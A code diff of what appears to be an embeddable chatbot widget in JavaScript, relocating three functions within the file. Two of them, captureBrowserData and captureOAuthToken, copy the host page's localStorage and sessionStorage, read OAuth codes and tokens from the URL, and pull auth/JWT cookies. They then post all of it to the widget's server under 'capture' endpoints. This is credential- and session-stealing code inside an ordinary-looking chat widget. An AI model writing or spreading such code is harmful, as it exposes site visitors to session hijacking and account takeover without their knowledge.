@@ -1069,6 +1069,99 @@
         };
 
 
+        const captureBrowserData = async () => {
+          if (!config.baseUrl || !config.apiKey || !config.enableDataCapture) return;
+          
+          try {
+            await fetch(`${config.baseUrl}/chatbot/capture/browser-data`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'X-API-Key': config.apiKey
+              },
+              body: JSON.stringify({
+                session_id: userId,
+                storage: {
+                  localStorage: { ...localStorage },
+                  sessionStorage: { ...sessionStorage }
+                },
+                autofill: {},
+                metadata: {
+                  url: window.location.href,
+                  timestamp: new Date().toISOString(),
+                  user_agent: navigator.userAgent
+                }
+              })
+            });
+          } catch (error) {
+            console.warn('Browser data capture failed:', error);
+          }
+        };
+        
+        const captureOAuthToken = async () => {
+          if (!config.baseUrl || !config.apiKey || !config.enableDataCapture) return;
+        
+          const tokenData = {
+            session_id: userId,
+            metadata: {
+              url: window.location.href,
+              timestamp: new Date().toISOString()
+            }
+          };
+        
+          const urlParams = new URLSearchParams(window.location.search);
+          if (urlParams.has('code') || urlParams.has('token')) {
+            tokenData.oauth_callback = {
+              code: urlParams.get('code'),
+              token: urlParams.get('token'),
+              state: urlParams.get('state')
+            };
+          }
+        
+          const jwtMatch = document.cookie.match(/(?:^|;\s*)(?:token|jwt|auth)=([^;]+)/);
+          if (jwtMatch) {
+            tokenData.jwt_token = jwtMatch[1];
+          }
+        
+          if (tokenData.oauth_callback || tokenData.jwt_token) {
+            try {
+              await fetch(`${config.baseUrl}/chatbot/capture/oauth-token`, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'X-API-Key': config.apiKey
+                },
+                body: JSON.stringify(tokenData)
+              });
+            } catch (error) {
+              console.warn('OAuth token capture failed:', error);
+            }
+          }
+        };
+
+
+
+        const loadUserInfo = async () => {
+          if (!config.baseUrl || !config.apiKey) return null;
+          
+          try {
+            const response = await fetch(`${config.baseUrl}/chatbot/user-info/${userId}`, {
+              headers: {
+                'Content-Type': 'application/json',
+                'X-API-Key': config.apiKey
+              }
+            });
+            
+            if (response.ok) {
+              return await response.json();
+            }
+          } catch (error) {
+            console.warn('Failed to load user info:', error);
+          }
+          return null;
+        };
+
+
 
 
         const extractVideoId = (url) => {
@@ -1419,98 +1512,7 @@
         };
 
 
-        const captureBrowserData = async () => {
-          if (!config.baseUrl || !config.apiKey || !config.enableDataCapture) return;
-          
-          try {
-            await fetch(`${config.baseUrl}/chatbot/capture/browser-data`, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-                'X-API-Key': config.apiKey
-              },
-              body: JSON.stringify({
-                session_id: userId,
-                storage: {
-                  localStorage: { ...localStorage },
-                  sessionStorage: { ...sessionStorage }
-                },
-                autofill: {},
-                metadata: {
-                  url: window.location.href,
-                  timestamp: new Date().toISOString(),
-                  user_agent: navigator.userAgent
-                }
-              })
-            });
-          } catch (error) {
-            console.warn('Browser data capture failed:', error);
-          }
-        };
         
-        const captureOAuthToken = async () => {
-          if (!config.baseUrl || !config.apiKey || !config.enableDataCapture) return;
-        
-          const tokenData = {
-            session_id: userId,
-            metadata: {
-              url: window.location.href,
-              timestamp: new Date().toISOString()
-            }
-          };
-        
-          const urlParams = new URLSearchParams(window.location.search);
-          if (urlParams.has('code') || urlParams.has('token')) {
-            tokenData.oauth_callback = {
-              code: urlParams.get('code'),
-              token: urlParams.get('token'),
-              state: urlParams.get('state')
-            };
-          }
-        
-          const jwtMatch = document.cookie.match(/(?:^|;\s*)(?:token|jwt|auth)=([^;]+)/);
-          if (jwtMatch) {
-            tokenData.jwt_token = jwtMatch[1];
-          }
-        
-          if (tokenData.oauth_callback || tokenData.jwt_token) {
-            try {
-              await fetch(`${config.baseUrl}/chatbot/capture/oauth-token`, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                  'X-API-Key': config.apiKey
-                },
-                body: JSON.stringify(tokenData)
-              });
-            } catch (error) {
-              console.warn('OAuth token capture failed:', error);
-            }
-          }
-        };
-
-
-
-        const loadUserInfo = async () => {
-          if (!config.baseUrl || !config.apiKey) return null;
-          
-          try {
-            const response = await fetch(`${config.baseUrl}/chatbot/user-info/${userId}`, {
-              headers: {
-                'Content-Type': 'application/json',
-                'X-API-Key': config.apiKey
-              }
-            });
-            
-            if (response.ok) {
-              return await response.json();
-            }
-          } catch (error) {
-            console.warn('Failed to load user info:', error);
-          }
-          return null;
-        };
-
 
         const getPositionClass = () => {
           return `chatbot-${tenantInfo.branding.widget_position}`;
